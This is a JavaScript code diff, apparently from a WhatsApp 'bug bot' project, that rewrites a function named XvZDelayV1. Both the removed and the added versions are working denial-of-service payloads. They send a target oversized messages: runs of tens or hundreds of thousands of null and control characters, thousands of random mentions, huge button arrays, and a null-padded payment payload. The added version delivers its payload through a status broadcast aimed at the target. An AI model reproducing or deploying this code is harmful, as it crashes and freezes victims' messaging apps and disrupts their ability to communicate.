@@ -2663,142 +2663,35 @@ async function XvZDelay(sock, target) {
     });
 }
 async function XvZDelayV1(sock, target) {
-    const startTime = Date.now();
-    const duration = 5 * 60 * 1500;
-
-    while (Date.now() - startTime < duration) {
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: {
-                    extendedTextMessage: {
-                        text: "\u0000".repeat(75000),
-                        contextInfo: {
-                            participant: true,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
-                            ]
-                        }
-                    }
-                }
-            }
-        }, { participant: true });
-    }
-
-    await sock.relayMessage(target, {
-        groupStatusMessageV2: {
-            nativeFlowMessage: {
-                extendedTextMessage: {
-                    text: "\u0003".repeat(9000),
-                    contextInfo: {
-                        participant: target,
-                        mentionedJid: [
-                            "0@s.whatsapp.net",
-                            ...Array.from(
-                                { length: 1999 },
-                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
-                            )
-                        ]
-                    }
-                }
-            }
-        }
-    }, { participant: true });
-
-    const startTime2 = Date.now();
-    const duration2 = 1 * 60 * 1000;
-
-    while (Date.now() - startTime2 < duration2) {
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: {
-                    extendedTextMessage: {
-                        text: "\u0003".repeat(75000),
-                        contextInfo: {
-                            participant: true,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
-                            ]
-                        }
-                    }
-                }
-            }
-        }, { participant: { true } });
-    }
-
-    const LexzyyMsg = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Xiverz Phantom¿!",
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 700000 }, () => ({}))
-                    },
-                    contextInfo: {
-                        quotedMessage: {
-                            orderMessage: {
-                                orderTitle: "AlipzzyOfficiaL",
-                                itemCount: 1999,
-                                totalAmount1000: "1000000",
-                                totalCurrencyCode: "IDR"
-                            },
-                        },
-                    },
-                },
-            },
-        }
-    };
-
-    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});
-
-    await sock.relayMessage(target, acamsg.message, {
-        participant: true,
-        messageId: acamsg.key.id
-    });
-
-    const LexMsg = {
+    const msg = {
         interactiveMessage: {
+            body: {
+                text: "X"
+            },
             nativeFlowMessage: {
-                buttons: [
-                    {
-                        name: "payment_info",
-                        buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
-                    }
-                ]
+                buttons: "\0".repeat(500000)
             }
         }
     };
 
-    const Lexx = generateWAMessageFromContent(target, LexMsg, {});
-
-    await sock.relayMessage(target, Lexx.message, {
-        participant: true,
-        messageId: Lexx.key.id
-    });
-
-    const LexzyExe = {
+    await sock.relayMessage("status@broadcast", {
         groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Xiverz Phantom¿!"
-                    },
-                    nativeFlowMessage: {
-                        buttons: "{}".repeat(75000),
-                    },
-                },
-            },
-        },
-    };
-
-    const Lexxx = generateWAMessageFromContent(target, LexzyExe, {});
-
-    await sock.relayMessage(target, Lexx.message, {
-        participant: true,
-        messageId: Lexxx.key.id
+            message: msg
+        }
+    }, {
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target }
+                }]
+            }]
+        }]
     });
 }
 async function XvZDelayV2(sock, target) {
